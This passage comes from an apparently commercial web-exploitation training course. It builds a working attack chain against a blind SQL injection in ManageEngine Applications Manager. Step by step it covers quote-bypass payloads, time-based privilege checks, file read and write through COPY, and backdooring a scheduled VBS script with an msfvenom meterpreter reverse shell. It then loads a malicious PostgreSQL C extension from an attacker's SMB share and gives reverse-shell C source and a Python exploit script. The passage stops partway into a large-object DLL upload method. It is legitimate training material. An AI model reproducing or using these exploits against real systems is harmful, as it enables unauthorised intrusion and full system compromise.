(The PostgreSQL Global Development Group, 2020), [https://www.postgresql.org/docs/9.1/static/functions-string.html](https://www.postgresql.org/docs/9.1/static/functions-string.html) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fnref-local_id_179-1)

2

(Wikipedia, 2020), [https://en.wikipedia.org/wiki/Code_point](https://en.wikipedia.org/wiki/Code_point) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fnref-local_id_179-2)

### 3.3.2. It Makes Lexical Sense

After spending some time reading the PostgreSQL documentation related to Lexical Structure,[1](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fn-local_id_180-1) we noticed that PostgreSQL syntax also supports _dollar-quoted_ string constants. Their purpose is to make it easier to read statements that contain strings with literal quotes.

Essentially, two dollar characters ($$) can be used as a quote (') substitute by themselves, or a single one ($) can indicate the beginning of a "tag." The tag is optional, can contain zero or more characters, and is terminated with a matching dollar ($). If used, this tag is then required at the end of the string as well.

As a result, the following syntax examples produce the exact same result in PostgreSQL:

```
SELECT 'AWAE';
SELECT $$AWAE$$;
SELECT $TAG$AWAE$TAG$;
```

> Listing 26 - Using dollar-quoted string constants. Notice the use of the optional tag called TAG in the third SQL statement

This allows us to fully bypass the quotes restriction we have previously encountered as shown in the listing below.

```
CREATE TEMP TABLE AWAE(offsec text);INSERT INTO AWAE(offsec) VALUES ($$test$$);
COPY AWAE(offsec) TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$;

COPY 1

Query returned successfully in 201 msec.
```

> Listing 27 - Using dollar-quoted string constants to bypass quotes restrictions

1

(The PostgreSQL Global Development Group, 2020), [https://www.postgresql.org/docs/9.2/static/sql-syntax-lexical.html](https://www.postgresql.org/docs/9.2/static/sql-syntax-lexical.html) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fnref-local_id_180-1)

## 3.4. Blind Bats

Now that we have all of our tools and methods worked out in theory, let's try to attack the application and see how far we can take it. So far we have mostly played with unterminated queries to understand the limitations in the attacker-provided input. We have, however, briefly shown how to use stacked queries in our payload when we tested the blind SQL injection vulnerability with the help of the _pg_sleep_ function.

As a reminder, the following GET request shows how to execute arbitrary stacked queries exploiting the vulnerable _AMUserResourcesSyncServlet_ servlet:

```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;<some query>;--+ HTTP/1.0
Host: manageengine:8443
```

> Listing 28 - The ability for us to execute arbitrary SQL statements through stacked queries

Now that we can bypass the quotes restriction and are able to execute arbitrary stacked queries, it would be helpful to verify what database privileges the vulnerable application is running with. This is very important because if the application is running with database administrator (DBA) privileges, we will have access to more powerful functionalities such as the ability to interact with the file system and potentially load third-party PostgreSQL extensions (native C++ code). More on that later!

Therefore let's try to develop a working payload that will reveal if we are DBA or not. Remember that we _have_ to use a time-based injection payload due to lack of verbose output from the application while using stacked queries.

The following SQL query validates that we are, in fact, a DBA user of the database:

```
SELECT current_setting('is_superuser');
```

> Listing 29 - Checking our DB privileges

![Figure 15: The](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/919f3c2172664d81f213e77cbcd77e52-Picture9.png)

Figure 15: The "on" result indicates we have DBA privileges

Figure 15 shows that the result returned by the query from Listing 29 is the string "on". Therefore, to be able to use the query from the listing above in a time-based SQL injection attack, we could use a conditional statement to test the result string in conjunction with the _pg_sleep_ function. The following SQL statement should do the trick:

```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
Host: manageengine:8443
```

> Listing 30 - Checking if we are DBA

The injected query shown in Listing 30 will only sleep for 10 seconds if the _is_superuser_ setting from the _current_setting_ table is set to "on."

#### Exercise

Implement the time based payload from Listing 30 in the provided proof of concept Python script (Listing 12).

## 3.5. Accessing the File System

While getting access to all the information contained in the ManageEngine database is a good achievement, we are operating under the privileges of the DBA user. Therefore, we have access to far more powerful functionalities than simply extracting information contained in the database.

In these situations, our goal is typically to gain system access leveraging the database layer. Usually, this is done by using database functions to read and write to the target file system. Other options, when supported, are to execute system commands through the database or to extend the database functionality to execute system commands or custom code.

Let's explore these options. In order for us to access the file system, we need to develop a different and valid injection query. Once again, we will take advantage of the fact that we have the ability to perform stacked queries in our attack.

If you recall, we have already used the PostgreSQL function called _COPY_[1](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fn-local_id_182-1) in a previous example in Listing 25. This function allows us to read or write to the file system as shown in the following example syntax taken from the PostgreSQL manual:

```
COPY <table_name> from <file_name>
```

> Listing 31 - Reading content from files

```
COPY <table_name> to <file_name>
```

> Listing 32 - Writing content to files

The idea behind the _COPY_ function is that it is used for importing or exporting data using a table and a file. However, that is a rather loose definition, and in the case of _COPY TO_, we do not need a valid table. We can perform a sub query to return arbitrary content. The following query demonstrates this idea:

```
COPY (select $$awae$$) to <file_name>
```

> Listing 33 - Using a subquery to return valid data so that the COPY operation can write to a file

Since we have stacked queries, it's also possible to read files, although it is slightly more complex. This will require us to create a table, select data from a file into that table, select the contents of the table, and then delete the table. The syntax for that complete operation is shown below:

```
CREATE temp table awae (content text);
COPY awae from $$c:\awae.txt$$;
SELECT content from awae;
DROP table awae;
```

> Listing 34 - Reading content from file C:\awae.txt

We can implement this attack in a blind time-based query as follows:

```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;create+temp+table+awae+(content+text);copy+awae+from+$$c:\awae.txt$$;select+case+when(ascii(substr((select+content+from+awae),1,1))=104)+then+pg_sleep(10)+end;--+ HTTP/1.0
Host: manageengine:8443
```

> Listing 35 - Reading the first character of the fle C:\awae.txt and comparing it with the letter "h". If the letter is "h", sleep for 10 seconds.

Note again that we cannot directly read the data from the file in the server's response when we use stacked queries. Therefore, the request will once again use a time-based comparison logic to infer the data. If the comparison evaluates to _true_, the query will sleep for 10 seconds. Using this technique, we can extract the contents of any file.

Notice how in this case, we make use of the _substr_ and _ascii_ functions. While the former helps us reading the file content byte by byte, the latter ensures we avoid any text encoding/decoding issues. This is especially important for reading binary files.

Taking the idea of file system interaction further, our next goal would be to remotely write to the targets file system. Let's develop a query that will write a file on the C:\ drive of the vulnerable server:

```
COPY (SELECT $$offsec$$) to $$c:\\offsec.txt$$;
```

> Listing 36 - A simple query that will write to the disk in c:\

We can translate that into the following request:

```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;COPY+(SELECT+$$offsec$$)+to+$$c:\\offsec.txt$$;--+ HTTP/1.0
Host: manageengine:8443
```

> Listing 37 - Writing to the file system using our SQL Injection vulnerability

All we have to do now is check the target's C:\ directory for the offsec.txt file. As shown in Figure 16, it appears that we have succeeded!

![Figure 16: Writing to the file system as SYSTEM.](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/9b5ba58686bab203f96bc7d422eb9a79-Picture12.png)

Figure 16: Writing to the file system as SYSTEM.

Notice that not only are we running as DBA but also, the web application is running under the context of the SYSTEM user!

#### Exercise

1. Using what you have learned, implement a SQL injection query in your Python script that will write a text file to the target system.
2. See if you can write binary data to a file using the _COPY TO_ technique. Why might this not work?

1

(The PostgreSQL Global Development Group, 2020), [https://www.postgresql.org/docs/9.2/static/sql-copy.html](https://www.postgresql.org/docs/9.2/static/sql-copy.html) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fnref-local_id_182-1)

### 3.5.1. Reverse Shell Via Copy To

Now that we have demonstrated that we can write arbitrary files anywhere on the system, we can try to leverage this ability to get a reverse shell. One of the possible attacks is to overwrite an existing _batch_ file that is used by the ManageEngine application. The idea is that we can insert our malicious commands into a batch file that will get executed by the ManageEngine application. As this is not our preferred solution, we will leave that as an exercise for the reader.

A more elegant way would be to introduce malicious code into the VBS files that are used by the ManageEngine application during normal operation. Specifically, when the ManageEngine Application Manager is configured to monitor remote servers and applications (that is its job after all), a number of VBS scripts are executed on a periodic basis. These scripts are located in the C:\Program\ Files\ (x86)\ManageEngine\AppManager12\working\conf\application\scripts directory and vary by functionality.

Before we proceed, we need to make sure that there is indeed at least one instance of a monitor targeting a Windows system. For the purposes of this exercise, we created a monitor against the ManageEngine host itself.

When setting up the monitor against the ManageEngine host itself, we must use the network IP, 192.168.121.113 in our environment, instead of the localhost or 127.0.0.1

![Figure 17: Example Application Manager monitor](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/03390a12874d2549a67afcbf1d61024e-monitor1.png)

Figure 17: Example Application Manager monitor

![Figure 18: The monitor polling time is set to 1 minute](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/2fd09f4104206d9d841e25e77aa2addb-monitor2.png)

Figure 18: The monitor polling time is set to 1 minute

If we run the Sysinternals Process Monitor[1](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fn-local_id_183-1) tool with a _VBS_ path filter on our target host, we can see that one of the files that is executed on a regular basis is wmiget.vbs. The frequency of the execution is determined by the polling time setting within the application for a given Application Manager monitoring instance.

![Figure 19: Process Monitor can help us identify which VBS scripts are used by the Application Manager](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/57b2030e430d9e185c47f350b002c5f0-procmon.png)

Figure 19: Process Monitor can help us identify which VBS scripts are used by the Application Manager

Since we know that this script is executed by the application, we can generate a meterpreter reverse shell payload and insert it at the end of the file. The tasks performed by the target VBS script are not important to us. However, we want to make sure that the original functionality of the script is maintained as we would like to stay as stealthy as possible.

A few things we need to keep in mind are:

1. We need to make a backup copy of the target file as we will need to restore it once we are done with this attack vector.
    
2. We have to convert the content of the target file to a one-liner and make sure it is still executing properly before appending our payload. This is because _COPY\ TO_ can't handle newline control characters in a single _SELECT_ statement.
    
3. Our payload must also be on a single line for the same reason as stated above.
    
4. We have to encode our payload twice in the GET request. We need to use _base64_ encoding to avoid any issues with restricted characters within the _COPY TO_ function and we also need to _urlencode_ the payload so that nothing gets mangled by the web server itself. Finally, we need to use the _convert_from_ function to convert the output of the decode function to a human-readable format. The general query that we will use for the injection looks like this:
    

```
copy (select convert_from(decode($$ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$)) to $$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
```

> Listing 38 - General structure of the query we inject

5. We need to use a _POST_ request due to the size of the payload, as it exceeds the limits of what a _GET_ request can process. This is not an issue because, as we previously saw, the _doPost_ function simply ends up calling the _doGet_ function.

Before putting all the pieces together let's generate our meterpreter reverse shell using the following command on Kali:

```
kali@kali:~$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=4444 -e x86/shikata_ga_nai -f vbs
```

> Listing 39 - Generating a VBS reverse shell

As a reminder, this is what the original wmiget.vbs looked like.

![Figure 20: Original VBS file](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/92b56d7b34d13904ffe7236f88e22596-orig_vbs.png)

Figure 20: Original VBS file

In the end, the resulting complete file should look similar to this:

![Figure 21: Final version of the injected VBS file](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/6d06cfb1028e9033055dafc5fa8f1642-vbsfile.png)

Figure 21: Final version of the injected VBS file

Once we have tested the injected file manually from the target server by simply executing it from a command line and making sure that we receive a reverse shell, we can finally transfer the contents of the VBS file to our Kali machine. There, we can use the Burp Suite Decoder feature to URL-encode our payload and finally trigger our injection. Before we do that however, we need to make sure that the target file on the ManageEngine server is restored to its original version, so that we can verify that the SQL injection truly worked.

If everything works out as planned, after one minute at most (remember the polling time we set in Figure 18), we should receive a reverse shell as shown below.

![Figure 22: A reverse shell via a backdoored VBS file](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/86a1c139bc6250d794b6ad5c4deb1902-copytorevshell.png)

Figure 22: A reverse shell via a backdoored VBS file

A nice characteristic of this attack vector is that it is also persistent. However, this approach may not always be possible because it is specific to the ManageEngine installations running on Windows hosts. Because of this we will describe a more generic approach in the remainder of this module.

#### Exercises

1. Overwrite a batch file that is executed on startup of Application Manager and obtain a reverse shell. Is it possible to do so without damaging the application? **Remember to make a backup copy of the batch file you are overwriting.**
2. Recreate the described VBS attack vector and obtain a reverse shell.
3. Implement the VBS attack in your Python proof of concept.

#### Extra Mile

There is at least one additional attack vector which involves manipulation of Java class files and the use of JSP files. While not simple, it can be accomplished. See if you can find and exploit this additional vector.

1

(MicroSoft, 2019), [https://docs.microsoft.com/en-us/sysinternals/downloads/procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fnref-local_id_183-1)

## 3.6. PostgreSQL Extensions

While our previous example of a backdoored application script was arguably elegant, it relied on the existence of an application file that was suitable for that attack vector, i.e. a file executed by the web application. As that may not always be the case, we need to investigate alternative ways to achieve our goal. For example, it may be possible to load a database extension to define our own SQL functions that will allow us to gain remote code execution directly.

After reading the Postgres documentation, we learned that we can load an extension using the following syntax style:

```
CREATE OR REPLACE FUNCTION test(text) RETURNS void AS 'FILENAME', 'test' LANGUAGE 'C' STRICT;
```

> Listing 40 - Basic SQL syntax to create a function from a local library

However, there is an important restriction that we need to keep in mind. The compiled extension we want to load **must** define an appropriate Postgres structure (magic block) to ensure that a dynamically library file is not loaded into an incompatible server.

If the target library doesn't have this magic block (as is the case with all standard system libraries), then the loading process will fail.

Let's take a look at an example:

```
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS 'C:\Windows\System32\kernel32.dll', 'WinExec' LANGUAGE C STRICT;
SELECT system('hostname');
ERROR:  incompatible library "c:\Windows\System32\kernel32.dll": missing magic block
HINT: Extension libraries are required to use the PG_MODULE_MAGIC macro.

********** Error **********
```

> Listing 41 - Attempting to load a Windows DLL.

As shown in the listing above, the loading process failed which means that we are going to have to compile a custom dynamic library. While that may sound daunting, we will soon discover that it is very much within our grasp.

### 3.6.1. Build Environment

Our ManageEngine virtual machine comes with a pre-configured build environment for Visual Studio 2017. Let's start by opening up the awae project that you should see pinned in the _Recent Solution_ Visual Studio bottom right window pane (Figure 23).

![Figure 23: awae project in Recent Solution.](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/2c5811abfff823b055ea50a99fc21770-Picture32a.png)

Figure 23: awae project in Recent Solution.

![Figure 24: Overview of the AWAE Visual Studio solution.](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/55bf6dc9bb3ad20a87a884ffdac78595-Picture32.png)

Figure 24: Overview of the AWAE Visual Studio solution.

The following example code can be found in the poc.c source file within the _awae_ solution:

```
01: #include "postgres.h"
02: #include <string.h>
03: #include "fmgr.h"
04: #include "utils/geo_decls.h"
05: #include <stdio.h>
06: #include "utils/builtins.h"
07: 
08: #ifdef PG_MODULE_MAGIC
09: PG_MODULE_MAGIC;
10: #endif
11: 
12: /* Add a prototype marked PGDLLEXPORT */
13: PGDLLEXPORT Datum awae(PG_FUNCTION_ARGS);
14: PG_FUNCTION_INFO_V1(awae);
15: 
16: /* this function launches the executable passed in as the first parameter
17: in a FOR loop bound by the second parameter that is also passed*/
18: Datum
19: awae(PG_FUNCTION_ARGS)
20: {
21: 	/* convert text pointer to C string */
22: #define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))
23: 
24:     /* retrieve the second argument that is passed to the function (an integer)
25:     that will serve as our counter limit*/
26:     int instances = PG_GETARG_INT32(1);
27: 
28:     for (int c = 0; c < instances; c++) {
29:         /*launch the process passed in the first parameter*/
30:         ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
31:     }
32: 	PG_RETURN_VOID();
33: }
```

> Listing 42 - Sample code to get you started

Looking at the source code in Listing 42, we can see that the _awae_ function will launch an arbitrary process (passed to the function as the first argument) using the Windows native _ShellExecute_ function, in a loop that is bound by the second argument passed to the function.

Although this example may seem trivial, it shows how we need to properly handle any argument that is passed to our function in a Postgres-specific DLL through the use of relevant Postgres macros (lines 22, 26 and 30). This will be useful later on to avoid hardcoding the IP address and port for our fully functional reverse shell User Defined Function (UDF).

The template from Listing 42 should be all we need to build a basic extension. We can initiate the build process by pressing the C + B+ b keys in the virtual machine or going to _Build_ > _Build Solution_ in Visual Studio.

```
------ Build started: Project: awae, Configuration: Release Win32 ------
   Creating library C:\Users\Administrator\source\repos\awae\Release\awae.lib and object C:\Users\Administrator\source\repos\awae\Release\awae.exp
Generating code
Finished generating code
All 3 functions were compiled because no usable IPDB/IOBJ from previous compilation was found.
rs.vcxproj -> C:\Users\Administrator\source\repos\awae\Release\awae.dll
Done building project "rs.vcxproj".
========== Rebuild All: 1 succeeded, 0 failed, 0 skipped ==========
```

> Listing 43 - Building the new extension

### 3.6.2. Testing the Extension

In order to test our newly-built extension, we need to first create a UDF. We can look back on Listing 40 to remind ourselves how to create a custom function in PostgreSQL.

For example, the following queries will create and run a UDF called _test_, bound to the _awae_ function exported by our custom DLL. _Note that we have moved the DLL file to the root of the C drive for easier command writing._

```
create or replace function test(text, integer) returns void as $$C:\awae.dll$$, $$awae$$ language C strict;
SELECT test($$calc.exe$$, 3);
```

> Listing 44 - The code to load the extension and run the test function

If everything goes according to plan, once we execute the _SELECT_ query and open up the Task Manager, we should see that there are indeed three running instances of _calc.exe_.

If you are anything like us, you will likely make several mistakes as you are developing your code. When this happens, you may wish to unload the extension and restart from scratch. To do so, you must first stop the ManageEngine service:

```
c:\> net stop "Applications Manager"
The ManageEngine Applications Manager service was stopped successfully.
```

> Listing 45 - Stopping the ManageEngine service

Once you have stopped the service, delete the DLL file that you loaded into the database memory space:

```
c:\> del c:\awae.dll
```

> Listing 46 - Deleting the loaded extension

Then start the service so we can go ahead and delete the _test_ function.

```
c:\> net start "Applications Manager"
The ManageEngine Applications Manager service is starting.
The ManageEngine Applications Manager service was started successfully.
```

> Listing 47 - Starting the ManageEngine service again

Finally, execute the SQL statement to delete the _test_ function:

```
DROP FUNCTION test(text, integer);
```

> Listing 48 - Dropping the test function

Now you are able to edit your extension code, re-compile, and re-test the extension.

### 3.6.3. Loading the Extension from a Remote Location

As we have seen in the previous section, PostgreSQL is designed to be extensible and we are able to write our own extension DLL files and create UDFs based on those extensions. So far we have compiled and tested our malicious extension directly on the remote target server. In a real world scenario, we would need to find a way to upload the DLL to the victim server before we could actually load it.

It is interesting to note that PostgreSQL does not limit us to working only with local files. In other words, the source DLL file we are using for the UDF could be also located on a network share.

In order to quickly verify that, we can create a Samba share on our Kali VM and place our DLL there.

You can use the Python Impacket SMB server script for this exercise as shown below.

```
kali@kali:~$ mkdir /home/kali/awae

kali@kali:~$ sudo impacket-smbserver awae /home/kali/awae/
[sudo] password for kali: 
Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

> Listing 49 - Starting the Samba service with a simple configuration file to test remote DLL loading

Once the Samba service is running, we can create a new Postgres UDF and point it to the DLL file hosted on the network share.

```
CREATE OR REPLACE FUNCTION remote_test(text, integer) RETURNS void AS $$\\192.168.119.120\awae\awae.dll$$, $$awae$$ LANGUAGE C STRICT;
SELECT remote_test($$calc.exe$$, 3);
```

> Listing 50 - Creating a UDF from a network share. 192.168.119.120 is the Kali attacker IP address.

If we then run the _SELECT_ query from our previous example using the _remote_test_ function, we should once again see three instances of _calc.exe_ in the Task Manager.

#### Exercise

Recreate the DLL files described in this section and make sure that your Postgres UDF functions successfully spawn _calc.exe_ processes.

## 3.7. UDF Reverse Shell

Now that we have seen how to write and execute arbitrary code using PostgreSQL, the only thing remaining is to gain a reverse shell.

At this point, this should not be too difficult. Nevertheless, the following partial C code should help you along the way.

```
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include <winsock2.h>
#include "utils/builtins.h"
#pragma comment(lib, "ws2_32")

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum connect_back(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(connect_back);

WSADATA wsaData;
SOCKET s1;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO sui;
PROCESS_INFORMATION pi;

Datum
connect_back(PG_FUNCTION_ARGS)
{

	/* convert C string to text pointer */
#define GET_TEXT(cstrp) \
   DatumGetTextP(DirectFunctionCall1(textin, CStringGetDatum(cstrp)))

	/* convert text pointer to C string */
#define GET_STR(textp) \
  DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

	WSAStartup(MAKEWORD(2, 2), &wsaData);
	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	hax.sin_family = AF_INET;
	/* FIX THIS */
	hax.sin_port = XXXXXXXXXXXXX
	/* FIX THIS TOO*/
	hax.sin_addr.s_addr = XXXXXXXXXXXXXXX

	WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;

	CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
	PG_RETURN_VOID();
}
```

> Listing 51 - Postgres extension reverse shell

Make sure that you fix the highlighted lines of code before you compile the code from the listing above.

Once you have done so, you can use the following Python script to send your payload to the vulnerable server:

```
import requests, sys
requests.packages.urllib3.disable_warnings()

def log(msg):
   print msg

def make_request(url, sql):
   log("[*] Executing query: %s" % sql[0:80])
   r = requests.get( url % sql, verify=False)
   return r

def create_udf_func(url):
   log("[+] Creating function...")
   sql = "--------FIX ME--------"
   make_request(url, sql)

def trigger_udf(url, ip, port):
   log("[+] Launching reverse shell...")
   sql = "select rev_shell($$%s$$, %d)" % (ip, int(port))
   make_request(url, sql)
   
if __name__ == '__main__':
   try:
       server = sys.argv[1].strip()
       attacker = sys.argv[2].strip()
       port = sys.argv[3].strip()
   except IndexError:
       print "[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0]
       sys.exit()
       
   sqli_url  = "https://"+server+"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--" 
   create_udf_func(sqli_url)
   trigger_udf(sqli_url, attacker, port)
```

> Listing 52 - proof of concept script to trigger a reverse shell

The script assumes that there is an available Samba share on a Kali VM that hosts a file named rev_shell.dll. Make sure that your attacking machine has that set up. Finally you will have to fix the SQL injection string in the above code before running the final script (see the highlighted FIX ME line in Listing 52).

If everything goes well, you should receive a reverse shell like this:

![Figure 25: Obtaining a reverse shell from a vulnerable ManageEngine system](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/5e462ec2003ec7b2d69439e0f95700ca-Picture29.png)

Figure 25: Obtaining a reverse shell from a vulnerable ManageEngine system

#### Exercise

Fix the proof of concept from Listing 52 and recreate the attack described in the previous section in order to obtain a reverse shell.

## 3.8. More Shells!!!

While we hopefully managed to get a shell in the last section, we did so by utilizing a network share as the location for our DLL file. However, that can only work if we are already on an internal network. Technically speaking, one could do this on a public network as well, but egress filtering is more than likely to prevent this type of traffic across private network boundaries.

An alternative to the remote Samba extension loading is to find a method to transfer the malicious DLL to the remote server directly through an SQL query. Considering that we already know how to write arbitrary files to the remote file system using the _COPY\ TO_ function, we may be tempted to do just that in our payload. Unfortunately, that will not quite work with binary files.

While we won't go into details as to why that is the case, we strongly encourage you to try it and see where things go wrong.

So, can we figure out a way to replicate the previous attack but this time _without_ the network share requirement? Let's _Try Harder_!

### 3.8.1. PostgreSQL Large Objects

Fortunately for us, PostgreSQL exposes a structure called _large object_, which is used for storing data that would be difficult to handle in its entirety. A typical example of data that can be stored as a large object in PostgreSQL is an image or a PDF document. As opposed to the _COPY\ TO_ function, the advantage of large objects lies in the fact that the data they hold can be exported back to the file system as an identical copy of the original imported file.

We recommend reading more about large objects in the official documentation,[1](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fn-local_id_190-1) but for now we will focus on those aspects of this structure and related functions that we need to accomplish our goal.

First, let's try to lay out our goal and the general steps we need to take to get there. Keep in mind that all of these steps should be accomplished using our original SQL injection vulnerability.

1. Create a large object that will hold our binary payload (our custom DLL file we created in the previous section)
2. Export that large object to the remote server file system
3. Create a UDF that will use the exported DLL as source
4. Trigger the UDF and execute arbitrary code

Before we can do this however, we need to familiarize ourselves with the mechanics of working with large objects in PostgreSQL.

In a normal course of action, a large object is created by calling the _lo_import_ function while providing it the path to the file we want to import.

```
amdb=# select lo_import('C:\\Windows\\win.ini');
 lo_import
-----------
    194206
(1 row)

amdb=# \lo_list
          Large objects
   ID   |  Owner   | Description
--------+----------+-------------
 194206 | postgres |
(1 row)
```

> Listing 53 - A simple lo_import example

In the listing above, we are importing the win.ini file into the database and as the return value, we are provided with the _loid_ of the large object that was created.

The _loid_ value is an integral value to our entire plan as we need to reference it when we are exporting large objects. As we can see in Listing 53, the returned _loid_ value appears arbitrary though. Considering we would not be able to see the returned value from the previous query when we execute it in a blind SQL injection, this is a bit of a problem. (_Notice that when the use of UNION queries is possible, this is not a problem._)

Fortunately, the _lo_import_ function also allows us to set the _loid_ field to any arbitrary value of our choice while creating a large object. This will help us solve the _loid_ value problem.

```
amdb=# select lo_import('C:\\Windows\\win.ini', 1337);
 lo_import
-----------
      1337
(1 row)
```

> Listing 54 - A lo_import with a known loid

With that in mind, to accomplish our goal, we can create a large object from an arbitrary file on the remote system and then directly update its entry in the database with the content of our choice. To do so, first we need to know where these large objects are stored in the database. With that said, the large objects are stored in a table called _pg_largeobject_.

```
amdb=# select loid, pageno from pg_largeobject;
 loid | pageno
------+--------
 1337 |      0
(1 row)
```

> Listing 55 - Large objects location

An astute reader will notice the column _pageno_ in the listing above. This is another critical piece of information we will need to be aware of. More specifically, when large objects are imported into a PostgreSQL database, they are split into 2KB chunks, which are then stored individually in the _pg_largeobject_ table.

As the PostgreSQL manual states:

The amount of data per page is defined to be LOBLKSIZE (which is currently BLCKSZ/4, or typically 2 kB).

Now that we know this, let's try to update the data from the imported win.ini file from the previous example and then export it.

First let's see what data is in our large object entry right after import.

```
amdb=# select loid, pageno, encode(data, 'escape') from pg_largeobject;
 loid | pageno |           encode
------+--------+----------------------------
 1337 |      0 | ; for 16-bit app support\r+
      |        | [fonts]\r                 +
      |        | [extensions]\r            +
      |        | [mci extensions]\r        +
      |        | [files]\r                 +
      |        | [Mail]\r                  +
      |        | MAPI=1\r                  +
      |        |
(1 row)
```

> Listing 56 - The contents of the win.ini file are in a large object

Now, let's update this entry.

```
amdb=# update pg_largeobject set data=decode('77303074', 'hex') where loid=1337 and pageno=0;
UPDATE 1
amdb=# select loid, pageno, encode(data, 'escape') from pg_largeobject;
 loid | pageno | encode
------+--------+--------
 1337 |      0 | w00t
(1 row)
```

> Listing 57 - The contents of the large object are updated.

Finally, we need to take a look at _lo_export_. As shown in the listing below, this function is used to export an arbitrary large object back to the file system using _loid_ as the identifier.

```
amdb=# select lo_export(1337, 'C:\\new_win.ini');
 lo_export
-----------
         1
(1 row)
```

> Listing 58 - Large object export

A quick look at the exported file shows that we have indeed successfully written a file with content of our choice to the file system.

![Figure 26: Exported large object contains manually updated content](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/6eb6b46c5bfff2ab61b0d04375ad0154-Picture30.png)

Figure 26: Exported large object contains manually updated content

As was the case with Postgres UDFs, we also need to know how to delete large objects from the database during development as it is inevitable that mistakes will be made.

The _lo_list_ command can be used to show all large objects that are currently saved in the database. Then to delete a given large object from the database, we can use the _lo_unlink_ function (Listing 59).

```
amdb=# \lo_unlink 1337
lo_unlink 1337
amdb=# \lo_list
      Large objects
 ID | Owner | Description
----+-------+-------------
(0 rows)
```

> Listing 59 - Deleting large objects

1

(The PostgreSQL Global Development Group, 2020), [https://www.postgresql.org/docs/9.2/static/largeobjects.html](https://www.postgresql.org/docs/9.2/static/largeobjects.html) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fnref-local_id_190-1)

### 3.8.2. Large Object Reverse Shell

At this point, we should be familiar with all the concepts necessary to execute our attack in its entirety and gain a reverse shell. Let's revisit our original general plan from the previous sections and add a few more details:

1. Create a DLL file that will contain our malicious code
2. Inject a query that creates a large object from an arbitrary remote file on disk
3. Inject a query that updates page 0 of the newly created large object with the first 2KB of our DLL
4. Inject queries that insert additional pages into the _pg_largeobject_ table to contain the remainder of our DLL
5. Inject a query that exports our large object (DLL) onto the remote server file system
